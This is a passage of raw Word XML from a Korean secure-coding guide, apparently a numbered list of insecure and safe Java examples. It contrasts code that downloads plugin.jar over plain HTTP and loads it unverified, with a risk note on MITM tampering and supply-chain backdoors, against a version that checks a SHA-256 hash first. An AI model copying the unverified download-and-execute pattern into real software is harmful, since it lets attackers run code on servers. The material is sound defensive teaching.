                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무결성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>다운로드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>URL url = new URL("http://update.example.com/plugin.jar");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>FileUtils.copyURLToFile(url, new File("plugin.jar"));</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">loadJar("plugin.jar");  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>여부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">http:// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>다운로드한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전송</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내용을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변조할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(MITM). </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변조된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> plugin.jar</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> JVM</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로드되면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정상적인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>업데이트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>과정이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>백도어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설치</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>경로로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악용되는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공급망</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격입니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] SHA-256 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>체크섬</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">String expectedHash = "a3f2...";  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>배포자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>공지한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>해시값</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>byte[] fileBytes = Files.readAllBytes(Paths.get("plugin.jar"));</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String actualHash = DigestUtils.sha256Hex(fileBytes);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!expectedHash.equals(actualHash)) throw new SecurityException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>변조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>감지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>loadJar("plugin.jar");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  16. </w:t>
      </w:r>
      <w:r>
